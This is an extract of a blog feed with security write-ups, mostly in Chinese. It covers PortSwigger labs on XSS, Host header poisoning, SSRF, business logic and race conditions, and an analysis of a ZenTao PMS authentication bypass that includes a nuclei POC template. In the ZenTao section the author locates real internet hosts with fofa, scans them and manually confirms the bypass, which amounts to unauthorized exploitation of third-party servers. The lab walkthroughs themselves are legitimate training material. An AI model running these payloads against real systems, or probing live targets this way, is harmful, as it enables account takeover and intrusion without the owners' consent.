class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;script&gt;</span><br><span class="hljs-attribute">location</span> = &#x27;https://xxx.web-security-academy.net/?search=%<span class="hljs-number">3</span>Cxss+id%<span class="hljs-number">3</span>Dx+onfocus%<span class="hljs-number">3</span>Dalert%<span class="hljs-number">28</span>document.cookie%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>tabindex=<span class="hljs-number">1</span>%<span class="hljs-number">3</span>E#x&#x27;;<br><span class="hljs-section">&lt;/script&gt;</span><br></code></pre></td></tr></table></figure><h2 id="Lab-Reflected-XSS-with-some-SVG-markup-allowed"><a href="#Lab-Reflected-XSS-with-some-SVG-markup-allowed" class="headerlink" title="Lab: Reflected XSS with some SVG markup allowed"></a>Lab: Reflected XSS with some SVG markup allowed</h2><p>This lab has a simple reflected XSS vulnerability. The site is blocking common tags but misses some SVG tags and events.</p><p>To solve the lab, perform a cross-site scripting attack that calls the <code>alert()</code> function.</p>]]></content>
    
    
    <categories>
      
      <category>Portswigger Labs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Portswigger Labs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Portswigger Labs — HTTP Host header attacks</title>
    <link href="/2024/07/23/Portswigger%20Labs%E2%80%8A%E2%80%94%E2%80%8AHTTP%20Host%20header%20attacks/"/>
    <url>/2024/07/23/Portswigger%20Labs%E2%80%8A%E2%80%94%E2%80%8AHTTP%20Host%20header%20attacks/</url>
    
    <content type="html"><![CDATA[<h1 id="Portswigger-Labs-—-HTTP-Host-header-attacks"><a href="#Portswigger-Labs-—-HTTP-Host-header-attacks" class="headerlink" title="Portswigger Labs — HTTP Host header attacks"></a>Portswigger Labs — HTTP Host header attacks</h1><h2 id="密码重置中毒"><a href="#密码重置中毒" class="headerlink" title="密码重置中毒"></a>密码重置中毒</h2><p>Lab: Basic password reset poisoning</p><p>This lab is vulnerable to password reset poisoning. The user <code>carlos</code> will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos’s account.</p><p>You can log in to your own account using the following credentials: <code>wiener:peter</code>. Any emails sent to this account can be read via the email client on the exploit server.</p><p>点击重置密码，发现存在如下post请求：</p><p><img src="/2023/04/27/file-upload/0231205101009509.png" alt="image-20231205101009509"></p><p>该请求用来向邮箱发送密码重置的链接，到email client查看：</p><p><img src="/2023/04/27/file-upload/0231205101037963.png" alt="image-20231205101037963"></p><p>尝试修改host头，改为test.com：</p><p><img src="/2023/04/27/file-upload/0231205101212875.png" alt="image-20231205101212875"></p><p>在邮箱中收到的链接也随之更改，说明该url是可控的。</p><p>接下来将host改为exploit server地址，username改为carlos：</p><p><img src="/2023/04/27/file-upload/0231205101145170.png" alt="image-20231205101145170"></p><p>此时在exploit server的access log中能够收到temp-forgot-password-token:</p><p><img src="/2023/04/27/file-upload/0231205101351405.png" alt="image-20231205101351405"></p><p>将该token替换到密码重置的链接中，即可重置carlos用户的密码：</p><p><img src="/2023/04/27/file-upload/0231205101432165.png" alt="image-20231205101432165"></p><h2 id="host头认证绕过"><a href="#host头认证绕过" class="headerlink" title="host头认证绕过"></a>host头认证绕过</h2><p>Lab: Host header authentication bypass</p><p>This lab makes an assumption about the privilege level of the user based on the HTTP Host header.</p><p>To solve the lab, access the admin panel and delete the user <code>carlos</code>.</p><p>访问&#x2F;admin会提示本地用户才能访问：</p><p><img src="/2023/04/27/file-upload/0231205110750033.png" alt="image-20231205110750033"></p><p>更改host为localhost：</p><p><img src="/2023/04/27/file-upload/0231205110812799.png" alt="image-20231205110812799"></p><p>到浏览器中访问：</p><p><img src="/2023/04/27/file-upload/0231205110826525.png" alt="image-20231205110826525"></p><p>成功绕过。</p><h2 id="通过不明确的请求导致-Web-缓存中毒"><a href="#通过不明确的请求导致-Web-缓存中毒" class="headerlink" title="通过不明确的请求导致 Web 缓存中毒"></a>通过不明确的请求导致 Web 缓存中毒</h2><p>Lab: Web cache poisoning via ambiguous requests</p><p>This lab is vulnerable to <a href="https://portswigger.net/web-security/web-cache-poisoning">web cache poisoning</a> due to discrepancies in how the cache and the back-end application handle ambiguous requests. An unsuspecting user regularly visits the site’s home page.</p><p>To solve the lab, poison the cache so the home page executes <code>alert(document.cookie)</code> in the victim’s browser.</p>]]></content>
    
    
    <categories>
      
      <category>Portswigger Labs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Portswigger Labs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Portswigger Labs— SSRF</title>
    <link href="/2024/07/23/Portswigger%20Labs%E2%80%94%E2%80%8ASSRF/"/>
    <url>/2024/07/23/Portswigger%20Labs%E2%80%94%E2%80%8ASSRF/</url>
    
    <content type="html"><![CDATA[<h1 id="Portswigger-Labs—-SSRF"><a href="#Portswigger-Labs—-SSRF" class="headerlink" title="Portswigger Labs— SSRF"></a>Portswigger Labs— SSRF</h1><h2 id="Portswigger-Labs—-SSRF基础"><a href="#Portswigger-Labs—-SSRF基础" class="headerlink" title="Portswigger Labs— SSRF基础"></a>Portswigger Labs— SSRF基础</h2><p>进入任意商品页面，点击check stock，会有如下报文：</p><p><img src="/2023/04/27/file-upload/0231212132834539.png" alt="image-20231212132834539"></p><p>将stockapi的值改为<a href="http://localhost/admin%EF%BC%9A">http://localhost/admin：</a></p><p><img src="/2023/04/27/file-upload/0231212132917745.png" alt="image-20231212132917745"></p><p>成功访问，接下来request in browser获取删除user的接口，继续通过stockapi访问即可：</p><p><img src="/2023/04/27/file-upload/0231212133203016.png" alt="image-20231212133203016"></p><h2 id="针对另一后端系统的Portswigger-Labs—-SSRF利用"><a href="#针对另一后端系统的Portswigger-Labs—-SSRF利用" class="headerlink" title="针对另一后端系统的Portswigger Labs— SSRF利用"></a>针对另一后端系统的Portswigger Labs— SSRF利用</h2><p>同样点击check stock，抓包并爆破：</p><p><img src="/2023/04/27/file-upload/0231212134021839.png" alt="image-20231212134021839"></p><p>当ip为192.168.0.18时，响应200.</p><p>发送删除用户的请求：</p><p><img src="/2023/04/27/file-upload/0231212134159888.png" alt="image-20231212134159888"></p><p>成功。</p><h2 id="Portswigger-Labs—-SSRF-collaborator外带数据"><a href="#Portswigger-Labs—-SSRF-collaborator外带数据" class="headerlink" title="Portswigger Labs— SSRF+collaborator外带数据"></a>Portswigger Labs— SSRF+collaborator外带数据</h2><p>在访问商品时，将如下报文发送到repeater：<br><img src="/2023/04/27/file-upload/0231212135141565.png" alt="image-20231212135141565"></p><p>插入collaborator payload，放包即可：</p><p><img src="/2023/04/27/file-upload/0231212135210890.png" alt="image-20231212135210890"></p><p>在client中发现dns和http请求：</p><p><img src="/2023/04/27/file-upload/0231212135255061.png" alt="image-20231212135255061"></p><h2 id="Portswigger-Labs—-SSRF黑名单绕过"><a href="#Portswigger-Labs—-SSRF黑名单绕过" class="headerlink" title="Portswigger Labs— SSRF黑名单绕过"></a>Portswigger Labs— SSRF黑名单绕过</h2><p>将stockapi改为127.0尝试绕过黑名单，失败：</p><p><img src="/2023/04/27/file-upload/0231212143855893.png" alt="image-20231212143855893"></p><p>admin编码同样失败，但是两次urlencode可以绕过限制：</p><p><img src="/2023/04/27/file-upload/0231212143958046.png" alt="image-20231212143958046"></p><p>删除用户，成功：</p><p><img src="/2023/04/27/file-upload/0231212144020716.png" alt="image-20231212144020716"></p>]]></content>
    
    
    <categories>
      
      <category>Portswigger Labs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Portswigger Labs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Portswigger Labs— Business logic vulnerabilities</title>
    <link href="/2024/07/23/Portswigger%20Labs%E2%80%94%E2%80%8ABusiness%20logic%20vulnerabilities/"/>
    <url>/2024/07/23/Portswigger%20Labs%E2%80%94%E2%80%8ABusiness%20logic%20vulnerabilities/</url>
    
    <content type="html"><![CDATA[<h1 id="Portswigger-Labs—-Business-logic-vulnerabilities"><a href="#Portswigger-Labs—-Business-logic-vulnerabilities" class="headerlink" title="Portswigger Labs— Business logic vulnerabilities"></a>Portswigger Labs— Business logic vulnerabilities</h1><h2 id="直接修改商品金额"><a href="#直接修改商品金额" class="headerlink" title="直接修改商品金额"></a>直接修改商品金额</h2><p>在添加商品时存在如下请求，将price改为1337：</p><p><img src="/2023/04/27/file-upload/20231205114451057.png" alt="image-20231205114451057"></p><p>send：</p><p><img src="/2023/04/27/file-upload/20231205114422739.png" alt="image-20231205114422739"></p><p>成功修改单价，支付成功：</p><p><img src="/2023/04/27/file-upload/20231205114438810.png" alt="image-20231205114438810"></p><h2 id="修改商品数量为负"><a href="#修改商品数量为负" class="headerlink" title="修改商品数量为负"></a>修改商品数量为负</h2><p>添加商品到购物车，报文如下：</p><p><img src="/2023/04/27/file-upload/20231205120108647.png" alt="image-20231205120108647"></p><p>添加另一件商品，查看购物车：</p><p><img src="/2023/04/27/file-upload/20231205120145721.png" alt="image-20231205120145721"></p><p>此时将添加商品的报文发送到repeater，quantity参数改为负数，发送数据包：</p><p><img src="/2023/04/27/file-upload/20231205120027633.png" alt="image-20231205120027633"></p><p>成功将购买价格降低到100以内，购买：</p><p><img src="/2023/04/27/file-upload/20231205120307968.png" alt="image-20231205120307968"></p><h2 id="不一致的安全控制"><a href="#不一致的安全控制" class="headerlink" title="不一致的安全控制"></a>不一致的安全控制</h2><p>直接访问&#x2F;admin：</p><p><img src="/2023/04/27/file-upload/20231205121232548.png" alt="image-20231205121232548"></p><p>会提示只有dontwannacry用户能够访问。</p><p>注册一个新用户，将email改为<a href="mailto:&#97;&#97;&#64;&#x64;&#111;&#110;&#116;&#119;&#97;&#x6e;&#110;&#x61;&#99;&#114;&#121;&#46;&#99;&#x6f;&#109;">&#97;&#97;&#64;&#x64;&#111;&#110;&#116;&#119;&#97;&#x6e;&#110;&#x61;&#99;&#114;&#121;&#46;&#99;&#x6f;&#109;</a>:</p><p><img src="/2023/04/27/file-upload/20231205121318141.png" alt="image-20231205121318141"></p><p>成功访问：</p><p><img src="/2023/04/27/file-upload/20231205121329829.png" alt="image-20231205121329829"></p><h2 id="优惠券复用"><a href="#优惠券复用" class="headerlink" title="优惠券复用"></a>优惠券复用</h2><p>在页面顶部会提示有一张优惠券NEWCUST5，填写底部sign up可获得第二张优惠券 SIGNUP30：</p><p><img src="/2023/04/27/file-upload/20231205121755136.png" alt="image-20231205121755136"></p><p>如果重复使用优惠券，会提示already applied：</p><p><img src="/2023/04/27/file-upload/20231205122132773.png" alt="image-20231205122132773"></p><p>但是如果交替使用两个优惠券，即可无限叠加：</p><p><img src="/2023/04/27/file-upload/20231205122125085.png" alt="image-20231205122125085"></p><p>成功购买：</p><p><img src="/2023/04/27/file-upload/20231205122158772.png" alt="image-20231205122158772"></p><h2 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h2><p>添加商品到购物车，此时的quantity最多设置为99：</p><p><img src="/2023/04/27/file-upload/20231205130454122.png" alt="image-20231205130454122"></p><p>尝试通过整数溢出来低价购买商品，将请求发送到intruder，并且设置为continue indefinitely:<img src="/2023/04/27/file-upload/20231205130525340.png" alt="image-20231205130525340"></p><p>刷新购物车，发现价格变为负数：</p><p><img src="/2023/04/27/file-upload/20231205130553655.png" alt="image-20231205130553655"></p><p>如果支付会提示支付金额小于0，接下来通过调整数量将金额精准控制在0-100即可：</p><p><img src="/2023/04/27/file-upload/20231205131128407.png" alt="image-20231205131128407"></p><h2 id="对异常输入的处理不一致"><a href="#对异常输入的处理不一致" class="headerlink" title="对异常输入的处理不一致"></a>对异常输入的处理不一致</h2><p>注册一个用户，邮箱为<a href="mailto:&#x61;&#97;&#97;&#46;&#46;&#x2e;&#x61;&#x61;&#97;&#97;&#x74;&#x74;&#x61;&#99;&#107;&#x65;&#x72;&#x40;&#101;&#x78;&#x70;&#x6c;&#x6f;&#105;&#x74;&#45;&#x30;&#97;&#97;&#52;&#x30;&#48;&#x31;&#102;&#x30;&#51;&#x32;&#x61;&#x39;&#x62;&#55;&#x65;&#56;&#x35;&#x61;&#49;&#49;&#x32;&#x34;&#x32;&#48;&#x31;&#55;&#48;&#48;&#x30;&#100;&#x36;&#x2e;&#101;&#x78;&#112;&#108;&#111;&#x69;&#x74;&#x2d;&#115;&#101;&#x72;&#118;&#101;&#114;&#46;&#x6e;&#101;&#x74;">&#x61;&#97;&#97;&#46;&#46;&#x2e;&#x61;&#x61;&#97;&#97;&#x74;&#x74;&#x61;&#99;&#107;&#x65;&#x72;&#x40;&#101;&#x78;&#x70;&#x6c;&#x6f;&#105;&#x74;&#45;&#x30;&#97;&#97;&#52;&#x30;&#48;&#x31;&#102;&#x30;&#51;&#x32;&#x61;&#x39;&#x62;&#55;&#x65;&#56;&#x35;&#x61;&#49;&#49;&#x32;&#x34;&#x32;&#48;&#x31;&#55;&#48;&#48;&#x30;&#100;&#x36;&#x2e;&#101;&#x78;&#112;&#108;&#111;&#x69;&#x74;&#x2d;&#115;&#101;&#x72;&#118;&#101;&#114;&#46;&#x6e;&#101;&#x74;</a>（一个超长字符串），邮箱验证后登录：</p><p><img src="/2023/04/27/file-upload/20231205132833527.png" alt="image-20231205132833527"></p><p>邮箱被截断为256字符。尝试访问&#x2F;admin：</p><p><img src="/2023/04/27/file-upload/20231205132856880.png" alt="image-20231205132856880"></p><p>利用截断的特性，注册一个<a href="mailto:&#x61;&#97;&#x61;&#x2e;&#46;&#46;&#46;&#97;&#x61;&#97;&#64;&#100;&#x6f;&#x6e;&#116;&#x77;&#97;&#110;&#110;&#x61;&#x63;&#x72;&#121;&#x2e;&#99;&#x6f;&#x6d;&#x2e;&#101;&#x78;&#112;&#108;&#x6f;&#x69;&#x74;&#x2d;&#x30;&#x61;&#97;&#x34;&#48;&#48;&#49;&#102;&#48;&#x33;&#x32;&#x61;&#57;&#98;&#55;&#x65;&#x38;&#53;&#97;&#x31;&#x31;&#x32;&#52;&#50;&#48;&#49;&#x37;&#48;&#x30;&#48;&#100;&#54;&#x2e;&#101;&#120;&#x70;&#x6c;&#111;&#x69;&#x74;&#45;&#115;&#101;&#x72;&#118;&#101;&#x72;&#46;&#110;&#x65;&#x74;">&#x61;&#97;&#x61;&#x2e;&#46;&#46;&#46;&#97;&#x61;&#97;&#64;&#100;&#x6f;&#x6e;&#116;&#x77;&#97;&#110;&#110;&#x61;&#x63;&#x72;&#121;&#x2e;&#99;&#x6f;&#x6d;&#x2e;&#101;&#x78;&#112;&#108;&#x6f;&#x69;&#x74;&#x2d;&#x30;&#x61;&#97;&#x34;&#48;&#48;&#49;&#102;&#48;&#x33;&#x32;&#x61;&#57;&#98;&#55;&#x65;&#x38;&#53;&#97;&#x31;&#x31;&#x32;&#52;&#50;&#48;&#49;&#x37;&#48;&#x30;&#48;&#100;&#54;&#x2e;&#101;&#120;&#x70;&#x6c;&#111;&#x69;&#x74;&#45;&#115;&#101;&#x72;&#118;&#101;&#x72;&#46;&#110;&#x65;&#x74;</a>即可，保证dontwannacry.com正好被截断：</p><p><img src="/2023/04/27/file-upload/20231205133036923.png" alt="image-20231205133036923"></p><p>此时即可成功访问：</p><p><img src="/2023/04/27/file-upload/20231205133102742.png" alt="image-20231205133102742"></p><h2 id="账户绑定验证不足"><a href="#账户绑定验证不足" class="headerlink" title="账户绑定验证不足"></a>账户绑定验证不足</h2><p>更改密码的请求包如下：</p><p><img src="/2023/04/27/file-upload/20231205133508985.png" alt="image-20231205133508985"></p><p>尝试删除current-password参数：</p><p><img src="/2023/04/27/file-upload/20231205133601957.png" alt="image-20231205133601957"></p><p>用户wiener同样可以成功登录。</p><p>将username改为administrator，修改密码：</p><p><img src="/2023/04/27/file-upload/20231205133629596.png" alt="image-20231205133629596"></p><p>成功删除carlos账户：</p><p><img src="/2023/04/27/file-upload/20231205134122670.png" alt="image-20231205134122670"></p><h2 id="购买状态绕过"><a href="#购买状态绕过" class="headerlink" title="购买状态绕过"></a>购买状态绕过</h2><p>首先尝试购买jacket，失败，余额不足。</p><p>尝试成功购买一件商品，在burp中发现一个&#x2F;cart&#x2F;order-confirmation?order-confirmed&#x3D;true请求，可能是用来确认购买状态：</p><p><img src="/2023/04/27/file-upload/20231205134858730.png" alt="image-20231205134858730"></p><p>将该请求发送到repeater，并且添加一件jacket到购物车中，send repeater：</p><p><img src="/2023/04/27/file-upload/20231205134940689.png" alt="image-20231205134940689"></p><p>成功购买。</p><h2 id="丢包绕过身份验证"><a href="#丢包绕过身份验证" class="headerlink" title="丢包绕过身份验证"></a>丢包绕过身份验证</h2><p>在登录后，首先需要选择角色：</p><p><img src="/2023/04/27/file-upload/20231205135853480.png" alt="image-20231205135853480"></p><p>选择后访问&#x2F;admin，均提示无法访问：</p><p><img src="/2023/04/27/file-upload/20231205135916877.png" alt="image-20231205135916877"></p><p>退出登录，在选择角色页面将请求drop：</p><p><img src="/2023/04/27/file-upload/20231205140216421.png" alt="image-20231205140216421"></p><p>再次访问&#x2F;admin，成功删除carlos。</p>]]></content>
    
    
    <categories>
      
      <category>Portswigger Labs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Portswigger Labs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Portswigger Labs — Race conditions</title>
    <link href="/2024/07/23/Portswigger%20Labs%E2%80%8A%E2%80%94%E2%80%8ARace%20conditions/"/>
    <url>/2024/07/23/Portswigger%20Labs%E2%80%8A%E2%80%94%E2%80%8ARace%20conditions/</url>
    
    <content type="html"><![CDATA[<h1 id="Portswigger-Labs-—-Race-conditions"><a href="#Portswigger-Labs-—-Race-conditions" class="headerlink" title="Portswigger Labs — Race conditions"></a>Portswigger Labs — Race conditions</h1><p><strong>Race conditions lab needs burp suite 2023.9 or later version.</strong></p><p><img src="/2023/04/27/file-upload/0231121110126957.png" alt="image-20231121110126957"></p><h2 id="Limit-overrun-race-conditions"><a href="#Limit-overrun-race-conditions" class="headerlink" title="Limit overrun race conditions"></a>Limit overrun race conditions</h2><p>In this section, we need to purchase a <strong>Lightweight L33t Leather Jacket</strong> which costs $1337, far beyond our credits — $50.</p><p>I add a jacket to my card and apply the code. We can see that there is 20% off and the traffic is following:</p><p><img src="/2023/04/27/file-upload/0231121110946085.png" alt="image-20231121110946085"></p><p>The server returned <code>Coupon applied.</code> Is it possible to combine the utilization of coupons to accomplish the ultimate objective of a successful purchase?</p><p>Let’s make it.</p><p>I press CTRL+R to send <code>/cart/coupon</code> request to repeater:</p><p><img src="/2023/04/27/file-upload/0231121111849742.png" alt="image-20231121111849742"></p><p>Next step is adding all tabs to a group after sending twenty requests.</p><p>Select <code>send group in parallel(single-packet attack)</code> and send group:</p><p><img src="/2023/04/27/file-upload/0231121112217795.png" alt="image-20231121112217795"></p><p>Now we make it possible to purchase the jacket just in price of $19.25(remove the code and attempt several more times if failed):</p><p><img src="/2023/04/27/file-upload/0231121112406764.png" alt="image-20231121112406764"></p><p>Place order and get a pass.</p><h2 id="Bypassing-rate-limits-via-race-conditions"><a href="#Bypassing-rate-limits-via-race-conditions" class="headerlink" title="Bypassing rate limits via race conditions"></a>Bypassing rate limits via race conditions</h2><p>The goal is to login in with carlos by brute-force and delete the user carlos finally.</p><p>First off, I try to login with random passwords manually to test the limitation of the server, and it locked my attempt for one minute after 5 times:</p><p><img src="/2023/04/27/file-upload/0231121113252838.png" alt="image-20231121113252838"></p><p>Come across such a situation, a wonder surfaces in my mind naturally that if breaking restrictions is achievable through race conditions?</p><p>Let’s have a try:</p><p>Right-click the login request and choose send to turbo intruder:</p><p><img src="/2023/04/27/file-upload/0231121114303462.png" alt="image-20231121114303462"></p><p>Then select a segment of content for use of %s in which I prefer UA headers.</p><p>Attack!</p><p><img src="/2023/04/27/file-upload/0231121114551997.png" alt="image-20231121114551997"></p><p><img src="/2023/04/27/file-upload/0231121114140455.png" alt="image-20231121114140455"></p><p>The responses with a packet length of 3602 indicate valid attempts, not <code>you are blocked.</code></p><p>Evidently, now we can attempt more than five times, effectively bypass the limit. So, next step is choosing appropriate scripts and make your own password list, without further ado, let’s run into next part of the lab.</p><h2 id="Multi-endpoint-race-conditions"><a href="#Multi-endpoint-race-conditions" class="headerlink" title="Multi-endpoint race conditions"></a>Multi-endpoint race conditions</h2><p>To solve the lab, successfully purchase a <strong>Lightweight L33t Leather Jacket</strong>. The difference is that we don’t have access to coupons.</p><p>How to make it? Let’s dig deeper.</p><p>To initiate the purchase of a jacket, we start by adding one gift card to the shopping cart. Simultaneously, we employ concurrent actions to add a jacket to the cart and proceed to the checkout process.</p><p><img src="/2023/04/27/file-upload/0231121135609450.png" alt="image-20231121135609450"></p><p>Certainly, let’s delve into the underlying principle behind this approach.</p><p>The key lies in the timing sequence during the payment phase. Initially, the order is submitted, and subsequently, the system verifies whether the available funds are sufficient. It is during this crucial time interval that we add the jacket to the shopping cart. As the server concludes its verification and order finalization, the jacket is indeed included in the purchase, effectively allowing us to successfully acquire the desired item.</p><h2 id="Single-endpoint-race-conditions"><a href="#Single-endpoint-race-conditions" class="headerlink" title="Single-endpoint race conditions"></a>Single-endpoint race conditions</h2><p>In this segment, we are acquired to utilize the account of winner, intercept the e-mail intended for carlos, and obtain admin privilege.</p><p>Upon logging in, click on UPDATE EMAIL. Subsequently, check the email client, where you will notice the necessity to click CONFIRM to initiate the process.</p><p><img src="/2023/04/27/file-upload/0231121135647155.png" alt="image-20231121135647155"></p><p>When sending multiple requests to modify the email, it becomes apparent that only the latest link remains valid. Consequently, the server may manipulate the confirmation links, presenting a potential issue.</p><p>Submit both a normal request and a malicious one to repeater, adding them into a group, and send it.</p><p><img src="/2023/04/27/file-upload/0231121135707674.png" alt="image-20231121135707674"></p><p>Click on carlos’s link, and now we possess administrative privileges.</p><p>That’s all!</p>]]></content>
    
    
    <categories>
      
      <category>Portswigger Labs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Portswigger Labs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>禅道项目管理系统身份认证绕过漏洞</title>
    <link href="/2024/07/23/%E7%A6%85%E9%81%93%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"/>
    <url>/2024/07/23/%E7%A6%85%E9%81%93%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="禅道项目管理系统身份认证绕过漏洞"><a href="#禅道项目管理系统身份认证绕过漏洞" class="headerlink" title="禅道项目管理系统身份认证绕过漏洞"></a>禅道项目管理系统身份认证绕过漏洞</h1><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>禅道项目管理软件是国产的开源项目管理软件，专注研发项目管理，内置需求管理、任务管理、bug管理、缺陷管理、用例管理、计划发布等功能，完整覆盖了研发项目管理的核心流程。</p><p>禅道项目管理系统存在身份认证绕过漏洞，远程攻击者利用该漏洞可以绕过身份认证，调用任意API接口并修改管理员用户的密码，以管理员用户登录该系统，能够完全接管服务器。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>16.x &lt;&#x3D; 禅道项目管理系统&lt; 18.12（开源版）<br>6.x &lt;&#x3D; 禅道项目管理系统&lt; 8.12（企业版）<br>3.x &lt;&#x3D; 禅道项目管理系统&lt; 4.12（旗舰版）</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>近期禅道PMS曝出一个身份绕过漏洞，并且已经有poc公开，poc如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">id:</span> <span class="hljs-string">easycorp-zentao-pms-idor</span><br><br><span class="hljs-attr">info:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">禅道项目管理系统身份认证绕过漏洞</span><br>  <span class="hljs-attr">author:</span> <span class="hljs-string">GuoRong_X</span><br>  <span class="hljs-attr">severity:</span> <span class="hljs-string">critical</span><br>  <span class="hljs-attr">description:</span> <span class="hljs-string">|</span><br><span class="hljs-string">    - 禅道系统某些API设计为通过特定的鉴权函数进行验证，但在实际实现中，这个鉴权函数在鉴权失败后并不中断请求，而是仅返回一个错误标志，这个返回值在后续没有被适当处理。此外，该系统在处理某些API时未能有效检查用户身份，允许未认证的用户执行某些操作，从而绕过鉴权机制。</span><br><span class="hljs-string"></span>  <span class="hljs-attr">reference:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://mp.weixin.qq.com/s/hiGI_fQmXOHdkPqn6x00Jw</span><br>  <span class="hljs-attr">metadata:</span><br>    <span class="hljs-attr">verified:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">fofa-query:</span> <span class="hljs-string">title=&quot;用户登录-</span> <span class="hljs-string">禅道&quot;</span><br>  <span class="hljs-attr">tags:</span> <span class="hljs-string">zentao</span><br><br><span class="hljs-attr">http:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">method:</span> <span class="hljs-string">GET</span><br>    <span class="hljs-attr">path:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;<span class="hljs-template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/api.php?m=testcase&amp;f=savexmindimport&amp;HTTP_X_REQUESTED_WITH=XMLHttpRequest&amp;productID=upkbbehwgfscwizoglpw&amp;branch=zqbcsfncxlpopmrvchsu&quot;</span><br><br>    <span class="hljs-attr">matchers-condition:</span> <span class="hljs-string">and</span><br>    <span class="hljs-attr">matchers:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">type:</span> <span class="hljs-string">word</span><br>        <span class="hljs-attr">part:</span> <span class="hljs-string">header</span><br>        <span class="hljs-attr">words:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;Set-Cookie: zentaosid=&#x27;</span><br><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">type:</span> <span class="hljs-string">status</span><br>        <span class="hljs-attr">status:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-number">200</span><br><span class="hljs-comment"># digest: 4a0a0047304502200b7a7cb58af457a9e566160cfdc539a99325db1513d5e4172a9a0a66f2f44e63022100fe0cc4ffd848c733eba3240bf102695253caa1420845a2b8aec5ca731e394759:58d4ffcb61df0489d6ab2fd018c17de6</span><br></code></pre></td></tr></table></figure><p>检测逻辑是，通过向目标url发送一个GET请求，如果响应码为200，并且header中包含<code>set-cookie： zentaosid=</code>，即存在漏洞。</p><p> 通过fofa找到几个目标，用nuclei扫描后手动尝试。先看看抓取的报文：</p><p><img src="/2023/04/27/file-upload/mage-20240428141753566.png" alt="image-20240428141753566"></p><p>在response中确实带了zentaosid。</p><p>把cookie加到请求header中：</p><p><img src="/2023/04/27/file-upload/mage-20240428141944497.png" alt="image-20240428141944497"></p><p>而不带cookie时，响应如下：</p><p><img src="/2023/04/27/file-upload/mage-20240428142106833.png" alt="image-20240428142106833"></p><p>由此可以判断，应该是利用成功了。</p><p>而在提取攻击特征时，测试了几个不同的ip，发现对于参数<code>m=testcase&amp;f=savexmindimport&amp;HTTP_X_REQUESTED_WITH=XMLHttpRequest&amp;productID=upkbbehwgfscwizoglpw&amp;branch=zqbcsfncxlpopmrvchsu</code>，有些ip只需要前三个参数即可，而有些ip需要带上全部参数，否则会提示param_code_missing，虽然也有zentaosid，但是带入到请求头中之后，会发现响应401，unauthorized：</p><p><img src="/2023/04/27/file-upload/mage-20240428142343577.png" alt="image-20240428142343577"></p><p>因此通过控制变量的方式似乎无法确定触发漏洞的点。</p><p>下面通过本地搭建环境，结合上源码来分析一下该漏洞的成因。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>这里使用的是linux一键安装包，版本为18.11，在本地kali中搭建。</p><p>下载地址如下：</p><p><a href="https://www.zentao.net/download/zentaopms18.11-83434.html">禅道18.11发布啦，内置12种AI小程序，全面兼容常用语言模型 - 禅道下载 - 禅道开源项目管理软件 (zentao.net)</a></p><p>下载到&#x2F;opt目录下，解压：</p><p><code>tar zxvf ZenTaoPMS-18.11-zbox_amd64.tar.gz</code></p><p><img src="/2023/04/27/file-upload/mage-20240428142837544.png" alt="image-20240428142837544"></p><p><code>/opt/zbox/zbox start</code>即可开启全部服务：</p><p><img src="/2023/04/27/file-upload/mage-20240428142912990.png" alt="image-20240428142912990"></p><p>输入ip:port，选择开源版本即可：</p><p><img src="/2023/04/27/file-upload/mage-20240428143009208.png" alt="image-20240428143009208"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="获取cookie"><a href="#获取cookie" class="headerlink" title="获取cookie"></a>获取cookie</h3><p><img src="/2023/04/27/file-upload/mage-20240428143412938.png" alt="image-20240428143412938"></p><h3 id="添加用户"><a href="#添加用户" 